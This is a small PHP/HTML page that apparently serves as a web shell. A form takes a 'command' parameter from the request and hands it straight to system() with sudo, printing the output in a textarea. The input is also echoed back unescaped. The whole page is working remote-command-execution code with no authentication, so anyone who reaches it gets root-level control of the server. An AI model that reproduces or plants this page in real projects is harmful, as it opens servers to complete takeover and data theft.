<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=GB2312">

</head>
<body bgcolor=#ffffff text=#000000 link=#0000cc vlink=#551a8b alink=#ff0000 onLoad=sf() topmargin=3 marginheight=3>
<br>
<br>
<?php
	$exec=NULL;
	import_request_variables("gp","cmd_");
	if($cmd_command) {$exec=$cmd_command;}
?>

<form action="" method="post" name=f>
cmd:

<?php
	if($exec) { echo $exec;}
?>
<br>
<input type="text" name="command" size="60" value='<?echo $exec;?>' >
<input name="submit_btn" type="submit" value="go"></p>
result:<br>
<textarea cols="80" rows="20" readonly>

<?php
	if($exec) { system("sudo $exec");}
 ?>

</textarea>
<p>
</form>
</body>
</html>
